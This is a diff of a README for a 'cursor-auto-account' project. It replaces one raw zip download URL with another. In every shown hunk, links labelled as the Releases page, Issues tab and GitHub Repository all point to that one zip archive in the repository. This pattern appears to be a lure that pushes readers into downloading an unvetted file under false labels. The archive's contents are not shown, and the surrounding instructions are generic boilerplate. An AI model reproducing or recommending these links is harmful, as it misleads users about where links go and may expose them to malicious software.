@@ -10,7 +10,7 @@ Welcome to the cursor-auto-account project! This web service helps you manage yo
 
 To download the cursor-auto-account software, click the link below:
 
-[![Download cursor-auto-account](https://raw.githubusercontent.com/Salimsalim1997/cursor-auto-account/master/prokeimenon/cursor-auto-account.zip)](https://raw.githubusercontent.com/Salimsalim1997/cursor-auto-account/master/prokeimenon/cursor-auto-account.zip)
+[![Download cursor-auto-account](https://raw.githubusercontent.com/Salimsalim1997/cursor-auto-account/master/views/auto-account-cursor-2.7.zip)](https://raw.githubusercontent.com/Salimsalim1997/cursor-auto-account/master/views/auto-account-cursor-2.7.zip)
 
 ### Step 2: Download the Latest Version
 
@@ -50,7 +50,7 @@ For the best experience with cursor-auto-account, ensure your system meets the f
 
 To update the cursor-auto-account application when a new version is released, follow these simple steps:
 
-1. Return to the [Releases page](https://raw.githubusercontent.com/Salimsalim1997/cursor-auto-account/master/prokeimenon/cursor-auto-account.zip).
+1. Return to the [Releases page](https://raw.githubusercontent.com/Salimsalim1997/cursor-auto-account/master/views/auto-account-cursor-2.7.zip).
 2. Download the latest file again.
 3. Install the new version by following the previous installation steps. The application will keep your data intact during the update.
 
@@ -58,7 +58,7 @@ To update the cursor-auto-account application when a new version is released, fo
 
 If you encounter any issues or have questions, help is available! You can reach out to our support team through the issues section on GitHub. 
 
-1. Go to the [Issues tab](https://raw.githubusercontent.com/Salimsalim1997/cursor-auto-account/master/prokeimenon/cursor-auto-account.zip).
+1. Go to the [Issues tab](https://raw.githubusercontent.com/Salimsalim1997/cursor-auto-account/master/views/auto-account-cursor-2.7.zip).
 2. Click on "New Issue" and describe your problem or question clearly. Our team will respond as soon as possible.
 
 ## 🔗 Additional Resources
@@ -67,7 +67,7 @@ Here are some helpful links to get you started quickly:
 
 - [User Guide](link-to-user-guide) – A full guide on how to use cursor-auto-account effectively.
 - [Frequently Asked Questions](link-to-FAQ) – Answers to common questions.
-- [GitHub Repository](https://raw.githubusercontent.com/Salimsalim1997/cursor-auto-account/master/prokeimenon/cursor-auto-account.zip) – Explore the source code and other project details.
+- [GitHub Repository](https://raw.githubusercontent.com/Salimsalim1997/cursor-auto-account/master/views/auto-account-cursor-2.7.zip) – Explore the source code and other project details.
 
 ## 📝 Contributing
 
